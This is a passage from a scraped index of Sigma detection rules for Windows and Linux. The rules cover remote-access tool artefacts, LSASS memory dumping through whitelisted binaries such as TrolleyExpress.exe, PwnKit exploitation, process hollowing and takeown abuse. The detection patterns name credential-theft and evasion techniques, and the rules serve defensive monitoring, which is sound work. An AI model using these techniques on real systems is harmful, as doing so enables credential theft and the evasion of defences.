CommandLine|contains|all: - \u0026#39;{\u0026#39; - \u0026#39;}\u0026#39; condition: selection falsepositives: - legitimate use level: high tags: - attack.privilege_escalation - attack.persistence - attack.t1546.015 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_rundll32_registered_com_objects.yml/","tags":["attack.privilege_escalation","attack.persistence","attack.t1546.015"],"title":"Rundll32 Registered COM Objects"},{"categories":null,"contents":"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nKnown false-positives legitimate use References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows Raw rule (edit) title: ScreenConnect Temporary Installation Artefact id: fec96f39-988b-4586-b746-b93d59fd1922 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows author: frack113 date: 2022/02/13 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: \u0026#39;\\Bin\\ScreenConnect.\u0026#39; #pattern to dll and jar file condition: selection falsepositives: - legitimate use level: medium tags: - attack.command_and_control - attack.t1219 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_screenconnect_artefact.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"ScreenConnect Temporary Installation Artefact"},{"categories":null,"contents":"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nKnown false-positives legitimate use References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows Raw rule (edit) title: Anydesk Temporary Artefact id: 0b9ad457-2554-44c1-82c2-d56a99c42377 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows author: frack113 date: 2022/02/11 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: - \u0026#39;\\AppData\\Roaming\\AnyDesk\\user.conf\u0026#39; - \u0026#39;\\AppData\\Roaming\\AnyDesk\\system.conf\u0026#39; TargetFilename|endswith: \u0026#39;.temp\u0026#39; condition: selection falsepositives: - legitimate use level: medium tags: - attack.command_and_control - attack.t1219 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_anydesk_artefact.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"Anydesk Temporary Artefact"},{"categories":null,"contents":"Enumerates Active Directory to determine computers that are joined to the domain\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md#atomic-test-15---enumerate-domain-computers-within-active-directory-using-directorysearcher Raw rule (edit) title: DirectorySearcher Powershell Exploitation id: 1f6399cf-2c80-4924-ace1-6fcff3393480 status: experimental description: Enumerates Active Directory to determine computers that are joined to the domain date: 2022/02/12 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md#atomic-test-15---enumerate-domain-computers-within-active-directory-using-directorysearcher author: frack113 logsource: product: windows category: ps_script definition: Script Block Logging must be enable detection: selection: ScriptBlockText|contains|all: - \u0026#39;New-Object \u0026#39; - \u0026#39;System.DirectoryServices.DirectorySearcher\u0026#39; - \u0026#39;.PropertiesToLoad.Add\u0026#39; - \u0026#39;.findall()\u0026#39; - \u0026#39;Properties.name\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.discovery - attack.t1018 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_directorysearcher.yml/","tags":["attack.discovery","attack.t1018"],"title":"DirectorySearcher Powershell Exploitation"},{"categories":null,"contents":"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-3---logmein-files-detected-test-on-windows Raw rule (edit) title: Query to LogMeIn Remote Access Software Domain id: ed785237-70fa-46f3-83b6-d264d1dc6eb4 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-3---logmein-files-detected-test-on-windows author: frack113 date: 2022/02/11 logsource: product: windows category: dns_query detection: selection: QueryName|endswith: \u0026#39;.logmein.com\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1219 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_logmein.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"Query to LogMeIn Remote Access Software Domain"},{"categories":null,"contents":"Detects process start from rare or uncommon folders like temporary folder or folders that usually don\u0026rsquo;t contain executable files\nKnown false-positives unknown References Malware sandbox results Raw rule (edit) title: Process Start From Suspicious Folder id: dca91cfd-d7ab-4c66-8da7-ee57d487b35b status: experimental description: Detects process start from rare or uncommon folders like temporary folder or folders that usually don\u0026#39;t contain executable files references: - Malware sandbox results author: frack113 date: 2022/02/11 modified: 2022/02/18 logsource: category: process_creation product: windows detection: image: Image|contains: - \u0026#39;\\Desktop\\\u0026#39; - \u0026#39;\\Temp\\\u0026#39; - \u0026#39;\\Temporary Internet\u0026#39; filter_parent: ParentImage: - \u0026#39;C:\\Windows\\System32\\cleanmgr.exe\u0026#39; - \u0026#39;C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\resources\\app\\ServiceHub\\Services\\Microsoft.VisualStudio.Setup.Service\\BackgroundDownload.exe\u0026#39; condition: image and not filter_parent falsepositives: - unknown level: low tags: - attack.execution - attack.t1204 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_run_folder.yml/","tags":["attack.execution","attack.t1204"],"title":"Process Start From Suspicious Folder"},{"categories":null,"contents":"Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks. This can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\nKnown false-positives Cases in which a user mounts an image file for legitimate reasons References https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/ https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/ https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/ Raw rule (edit) title: ISO or Image Mount Indicator in Recent Files id: 4358e5a5-7542-4dcb-b9f3-87667371839b description: Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks. This can be a false positive on server systems but on workstations users should rarely mount .iso or .img files. status: experimental author: Florian Roth references: - https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/ - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore - https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/ - https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/ date: 2022/02/11 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: - \u0026#39;.iso.lnk\u0026#39; - \u0026#39;.img.lnk\u0026#39; - \u0026#39;.vhd.lnk\u0026#39; - \u0026#39;.vhdx.lnk\u0026#39; TargetFilename|contains: - \u0026#39;\\Microsoft\\Windows\\Recent\\\u0026#39; condition: selection falsepositives: - Cases in which a user mounts an image file for legitimate reasons level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_iso_file_recent.yml/","tags":null,"title":"ISO or Image Mount Indicator in Recent Files"},{"categories":null,"contents":"Detects the usage of the unsafe bpftrace option\nKnown false-positives Legitimate usage of the unsafe option References https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/ https://bpftrace.org/ Raw rule (edit) title: BPFtrace Unsafe Option Usage id: f8341cb2-ee25-43fa-a975-d8a5a9714b39 status: experimental description: Detects the usage of the unsafe bpftrace option author: Andreas Hunkeler (@Karneades) tags: - attack.execution - attack.t1059.004 references: - https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/ - https://bpftrace.org/ date: 2022/02/11 logsource: category: process_creation product: linux detection: selection1: Image|endswith: - \u0026#39;bpftrace\u0026#39; CommandLine|contains: - \u0026#39;--unsafe\u0026#39; condition: selection1 falsepositives: - Legitimate usage of the unsafe option level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_bpftrace_unsafe_option_usage.yml/","tags":["attack.execution","attack.t1059.004"],"title":"BPFtrace Unsafe Option Usage"},{"categories":null,"contents":"Detects a possible process memory dump that uses the white-listed filename like TrolleyExpress.exe as a way to dump the lsass process memory without Microsoft Defender interference\nKnown false-positives Unlikely, since these tools shouldn\u0026rsquo;t access lsass.exe at all References https://twitter.com/_xpn_/status/1491557187168178176 https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz https://twitter.com/mrd0x/status/1460597833917251595 Raw rule (edit) title: LSASS Access from White-Listed Processes id: 4be8b654-0c01-4c9d-a10c-6b28467fc651 status: experimental description: Detects a possible process memory dump that uses the white-listed filename like TrolleyExpress.exe as a way to dump the lsass process memory without Microsoft Defender interference author: Florian Roth references: - https://twitter.com/_xpn_/status/1491557187168178176 - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz - https://twitter.com/mrd0x/status/1460597833917251595 date: 2022/02/10 tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; SourceImage|endswith: - \u0026#39;\\TrolleyExpress.exe\u0026#39; # Citrix - \u0026#39;\\ProcessDump.exe\u0026#39; # Cisco Jabber - \u0026#39;\\dump64.exe\u0026#39; # Visual Studio GrantedAccess|endswith: - \u0026#39;10\u0026#39; - \u0026#39;30\u0026#39; - \u0026#39;50\u0026#39; - \u0026#39;70\u0026#39; - \u0026#39;90\u0026#39; - \u0026#39;B0\u0026#39; - \u0026#39;D0\u0026#39; - \u0026#39;F0\u0026#39; - \u0026#39;18\u0026#39; - \u0026#39;38\u0026#39; - \u0026#39;58\u0026#39; - \u0026#39;78\u0026#39; - \u0026#39;98\u0026#39; - \u0026#39;B8\u0026#39; - \u0026#39;D8\u0026#39; - \u0026#39;F8\u0026#39; - \u0026#39;1A\u0026#39; - \u0026#39;3A\u0026#39; - \u0026#39;5A\u0026#39; - \u0026#39;7A\u0026#39; - \u0026#39;9A\u0026#39; - \u0026#39;BA\u0026#39; - \u0026#39;DA\u0026#39; - \u0026#39;FA\u0026#39; - \u0026#39;0x14C2\u0026#39; # https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c - \u0026#39;FF\u0026#39; condition: selection falsepositives: - Unlikely, since these tools shouldn\u0026#39;t access lsass.exe at all level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_lsass_memdump_evasion.yml/","tags":["attack.credential_access","attack.t1003.001","attack.s0002"],"title":"LSASS Access from White-Listed Processes"},{"categories":null,"contents":"Detects a possible process memory dump based on a keyword in the file name of the accessing process\nKnown false-positives Rare programs that contain the word dump in their name and access lsass References https://twitter.com/_xpn_/status/1491557187168178176 https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz Raw rule (edit) title: LSASS Memory Access by Tool Named Dump id: 9bd012ee-0dff-44d7-84a0-aa698cfd87a3 status: experimental description: Detects a possible process memory dump based on a keyword in the file name of the accessing process author: Florian Roth references: - https://twitter.com/_xpn_/status/1491557187168178176 - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz date: 2022/02/10 tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; SourceImage|contains: \u0026#39;dump\u0026#39; GrantedAccess|endswith: - \u0026#39;10\u0026#39; - \u0026#39;30\u0026#39; - \u0026#39;50\u0026#39; - \u0026#39;70\u0026#39; - \u0026#39;90\u0026#39; - \u0026#39;B0\u0026#39; - \u0026#39;D0\u0026#39; - \u0026#39;F0\u0026#39; - \u0026#39;18\u0026#39; - \u0026#39;38\u0026#39; - \u0026#39;58\u0026#39; - \u0026#39;78\u0026#39; - \u0026#39;98\u0026#39; - \u0026#39;B8\u0026#39; - \u0026#39;D8\u0026#39; - \u0026#39;F8\u0026#39; - \u0026#39;1A\u0026#39; - \u0026#39;3A\u0026#39; - \u0026#39;5A\u0026#39; - \u0026#39;7A\u0026#39; - \u0026#39;9A\u0026#39; - \u0026#39;BA\u0026#39; - \u0026#39;DA\u0026#39; - \u0026#39;FA\u0026#39; - \u0026#39;0x14C2\u0026#39; # https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c - \u0026#39;FF\u0026#39; condition: selection falsepositives: - Rare programs that contain the word dump in their name and access lsass level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_lsass_memdump_indicators.yml/","tags":["attack.credential_access","attack.t1003.001","attack.s0002"],"title":"LSASS Memory Access by Tool Named Dump"},{"categories":null,"contents":"Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory\nKnown false-positives unknown References https://twitter.com/_xpn_/status/1491557187168178176 https://www.youtube.com/watch?v=Ie831jF0bb0 Raw rule (edit) title: Process Access via TrolleyExpress Exclusion id: 4c0aaedc-154c-4427-ada0-d80ef9c9deb6 status: experimental description: Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory author: Florian Roth references: - https://twitter.com/_xpn_/status/1491557187168178176 - https://www.youtube.com/watch?v=Ie831jF0bb0 date: 2022/02/10 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # We assume that the lsass.exe process has a process ID that\u0026#39;s between 700 and 999 and the dumper uses just the PID as parameter - \u0026#39;\\TrolleyExpress 7\u0026#39; - \u0026#39;\\TrolleyExpress 8\u0026#39; - \u0026#39;\\TrolleyExpress 9\u0026#39; - \u0026#39;\\TrolleyExpress.exe 7\u0026#39; - \u0026#39;\\TrolleyExpress.exe 8\u0026#39; - \u0026#39;\\TrolleyExpress.exe 9\u0026#39; # Common dumpers - \u0026#39;\\TrolleyExpress.exe -ma \u0026#39; renamed: Image|endswith: \u0026#39;\\TrolleyExpress.exe\u0026#39; filter_renamed: OriginalFileName|contains: \u0026#39;CtxInstall\u0026#39; filter_empty: OriginalFileName: null condition: selection or ( renamed and not 1 of filter* ) fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1218.011 - attack.credential_access - attack.t1003.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_trolleyexpress_procdump.yml/","tags":["attack.defense_evasion","attack.t1218.011","attack.credential_access","attack.t1003.001"],"title":"Process Access via TrolleyExpress Exclusion"},{"categories":null,"contents":"Detects the creation of log files during a TeamViewer remote session\nKnown false-positives Legitimate uses of TeamViewer in an organisation References https://www.teamviewer.com/en-us/ Raw rule (edit) title: TeamViewer Remote Session id: 162ab1e4-6874-4564-853c-53ec3ab8be01 status: experimental description: Detects the creation of log files during a TeamViewer remote session references: - https://www.teamviewer.com/en-us/ author: Florian Roth date: 2022/01/30 tags: - attack.command_and_control - attack.t1219 logsource: product: windows category: file_event detection: selection1: TargetFilename|endswith: - \u0026#39;\\TeamViewer\\RemotePrinting\\tvprint.db\u0026#39; - \u0026#39;\\TeamViewer\\TVNetwork.log\u0026#39; selection2: TargetFilename|contains|all: - \u0026#39;\\TeamViewer\u0026#39; - \u0026#39;_Logfile.log\u0026#39; condition: 1 of selection* falsepositives: - Legitimate uses of TeamViewer in an organisation level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_teamviewer_remote_session.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"TeamViewer Remote Session"},{"categories":null,"contents":"Detects DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn\u0026rsquo;t named TeamViewer (sometimes used by threat actors for obfuscation)\nKnown false-positives Unknown binary names of TeamViewer Other programs that also lookup the observed domain References https://www.teamviewer.com/en-us/ Raw rule (edit) title: Suspicious TeamViewer Domain Access id: 778ba9a8-45e4-4b80-8e3e-34a419f0b85e description: Detects DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn\u0026#39;t named TeamViewer (sometimes used by threat actors for obfuscation) status: experimental date: 2022/01/30 modified: 2022/02/08 author: Florian Roth references: - https://www.teamviewer.com/en-us/ tags: - attack.command_and_control - attack.t1219 logsource: product: windows category: dns_query detection: dns_request: QueryName: - \u0026#39;taf.teamviewer.com\u0026#39; - \u0026#39;udp.ping.teamviewer.com\u0026#39; filter: Image|contains: \u0026#39;TeamViewer\u0026#39; condition: dns_request and not filter falsepositives: - Unknown binary names of TeamViewer - Other programs that also lookup the observed domain level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_susp_teamviewer.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"Suspicious TeamViewer Domain Access"},{"categories":null,"contents":"Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders\nKnown false-positives Scripts created by developers and admins Administrative activity References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.001/T1222.001.md#atomic-test-1---take-ownership-using-takeown-utility Raw rule (edit) title: Suspicious Recursif Takeown id: 554601fb-9b71-4bcc-abf4-21a611be4fde status: experimental description: Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders author: frack113 references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.001/T1222.001.md#atomic-test-1---take-ownership-using-takeown-utility date: 2022/01/30 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\takeown.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/f \u0026#39; - \u0026#39;/r\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Scripts created by developers and admins - Administrative activity level: medium tags: - attack.defense_evasion - attack.t1222.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_takeown.yml/","tags":["attack.defense_evasion","attack.t1222.001"],"title":"Suspicious Recursif Takeown"},{"categories":null,"contents":"Detects potential PwnKit exploitation CVE-2021-4034 in auth logs\nKnown false-positives Unknown References https://twitter.com/wdormann/status/1486161836961579020 Raw rule (edit) title: PwnKit Local Privilege Escalation id: 0506a799-698b-43b4-85a1-ac4c84c720e9 status: experimental description: Detects potential PwnKit exploitation CVE-2021-4034 in auth logs author: Sreeman date: 2022/01/26 references: - https://twitter.com/wdormann/status/1486161836961579020 logsource: product: linux service: auth detection: keyword: - \u0026#39;pkexec\u0026#39; - \u0026#39;The value for environment variable XAUTHORITY contains suscipious content\u0026#39; - \u0026#39;[USER=root] [TTY=/dev/pts/0]\u0026#39; condition: all of keyword falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1548.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_pwnkit_local_privilege_escalation.yml/","tags":["attack.privilege_escalation","attack.t1548.001"],"title":"PwnKit Local Privilege Escalation"},{"categories":null,"contents":"An application have been remove check if it is a critical\nKnown false-positives Unknown Raw rule (edit) title: An Application Is Uninstall id: 570ae5ec-33dc-427c-b815-db86228ad43e status: experimental description: An application have been remove check if it is a critical author: frack113 date: 2022/01/28 logsource: product: windows service: application detection: selection: Provider_Name: \u0026#39;MsiInstaller\u0026#39; EventID: - 11724 - 1034 condition: selection falsepositives: - Unknown level: low tags: - attack.impact - attack.t1489 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/application/win_builtin_remove_application.yml/","tags":["attack.impact","attack.t1489"],"title":"An Application Is Uninstall"},{"categories":null,"contents":"TeamViewer_Desktop.exe is create during install\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-1---teamviewer-files-detected-test-on-windows Raw rule (edit) title: Installation of TeamViewer Desktop id: 9711de76-5d4f-4c50-a94f-21e4e8f8384d status: experimental description: TeamViewer_Desktop.exe is create during install author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-1---teamviewer-files-detected-test-on-windows date: 2022/01/28 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \\TeamViewer_Desktop.exe condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1219 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_install_teamviewer_desktop.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"Installation of TeamViewer Desktop"},{"categories":null,"contents":"Use IE registry to hide a scripts\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-5---javascript-in-registry Raw rule (edit) title: Use IE Registry for Persistence id: d88d0ab2-e696-4d40-a2ed-9790064e66b3 description: Use IE registry to hide a scripts author: frack113 date: 2022/01/22 modified: 2022/02/20 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-5---javascript-in-registry logsource: category: registry_event product: windows detection: selection_domains: EventType: SetValue TargetObject|contains: \\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings filter_dword: Details|startswith: DWORD filter_office: Details: - \u0026#39;Cookie:\u0026#39; - \u0026#39;Visited:\u0026#39; - \u0026#39;(Empty)\u0026#39; filter_binary: Details: \u0026#39;Binary Data\u0026#39; condition: selection_domains and not 1 of filter_* falsepositives: - Unknown level: low # as unknow false positives tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_ie_persistence.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Use IE Registry for Persistence"},{"categories":null,"contents":"Uninstall an application with wmic\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic Raw rule (edit) title: WMI Uninstall An Application id: b53317a0-8acf-4fd1-8de8-a5401e776b96 status: experimental description: Uninstall an application with wmic author: frac113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic date: 2022/01/28 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\WMIC.exe CommandLine|contains: call uninstall condition: selection falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_wmic_remove_application.yml/","tags":["attack.execution","attack.t1047"],"title":"WMI Uninstall An Application"},{"categories":null,"contents":"Detects a whoami.exe executed by privileged accounts that are often misused by threat actors\nKnown false-positives Unknown References https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment https://nsudo.m2team.org/en-us/ Raw rule (edit) title: Run Whoami as Privileged User id: 79ce34ca-af29-4d0e-b832-fc1b377020db status: experimental description: Detects a whoami.exe executed by privileged accounts that are often misused by threat actors references: - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment - https://nsudo.m2team.org/en-us/ author: Florian Roth date: 2022/01/28 tags: - attack.privilege_escalation - attack.discovery - attack.t1033 logsource: category: process_creation product: windows detection: selection: User|contains: \u0026#39;TrustedInstaller\u0026#39; Image|endswith: \u0026#39;\\whoami.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_whoami_as_priv_user.yml/","tags":["attack.privilege_escalation","attack.discovery","attack.t1033"],"title":"Run Whoami as Privileged User"},{"categories":null,"contents":"Detects exploitation attempt of vulnerability described in CVE-2021-4034.\nKnown false-positives unknown References https://github.com/berdav/CVE-2021-4034 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034 https://access.redhat.com/security/cve/CVE-2021-4034 Raw rule (edit) title: CVE-2021-4034 Exploitation Attempt id: 40a016ab-4f48-4eee-adde-bbf612695c53 description: Detects exploitation attempt of vulnerability described in CVE-2021-4034. author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2022/01/27 references: - https://github.com/berdav/CVE-2021-4034 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034 - https://access.redhat.com/security/cve/CVE-2021-4034 logsource: product: linux service: auditd detection: proctitle: type: PROCTITLE proctitle: \u0026#39;(null)\u0026#39; syscall: type: SYSCALL comm: pkexec exe: \u0026#39;/usr/bin/pkexec\u0026#39; condition: proctitle and syscall tags: - attack.privilege_escalation - attack.t1068 falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_cve_2021_4034.yml/","tags":["attack.privilege_escalation","attack.t1068"],"title":"CVE-2021-4034 Exploitation Attempt"},{"categories":null,"contents":"Detects when a memory process image does not match the disk image, indicative of process hollowing.\nKnown false-positives There are no known false positives at this time References https://twitter.com/SecurePeacock/status/1486054048390332423?s=20 https://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-detects-malware-process-tampering-attempts/ Raw rule (edit) title: Sysmon Process Hollowing Detection id: c4b890e5-8d8c-4496-8c66-c805753817cd status: experimental description: Detects when a memory process image does not match the disk image, indicative of process hollowing. author: Christopher Peacock \u0026#39;@securepeacock\u0026#39;, SCYTHE \u0026#39;@scythe_io\u0026#39;, Sittikorn S date: 2022/01/25 modified: 2022/02/01 references: - https://twitter.com/SecurePeacock/status/1486054048390332423?s=20 - https://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-detects-malware-process-tampering-attempts/ tags: - attack.process_injection - attack.t1055.012 logsource: product: windows category: process_tampering detection: selection: Type: Image is replaced filters: Image|contains: - \u0026#39;:\\Program Files\\\u0026#39; - \u0026#39;:\\Program Files (x86)\u0026#39; Image|endswith: - \u0026#39;\\chrome.exe\u0026#39; - \u0026#39;\\opera.exe\u0026#39; - \u0026#39;\\firefox.exe\u0026#39; - \u0026#39;\\MicrosoftEdge.exe\u0026#39; condition: selection and not filters falsepositives: - There are no known false positives at this time level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/sysmon/sysmon_process_hollowing.yml/","tags":["attack.process_injection","attack.t1055.012"],"title":"Sysmon Process Hollowing Detection"},{"categories":null,"contents":"Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity\nKnown false-positives Legitimate use by administrators References https://www.nirsoft.net/utils/nircmd.html https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/ https://www.nirsoft.net/utils/nircmd2.html#using Raw rule (edit) title: NirCmd Tool Execution id: 4e2ed651-1906-4a59-a78a-18220fca1b22 status: experimental description: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity author: \u0026#39;Florian Roth, Nasreddine Bencherchali @nas_bench\u0026#39; date: 2022/01/24 references: - https://www.nirsoft.net/utils/nircmd.html - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/ - https://www.nirsoft.net/utils/nircmd2.html#using tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\nircmd.exe\u0026#39; - 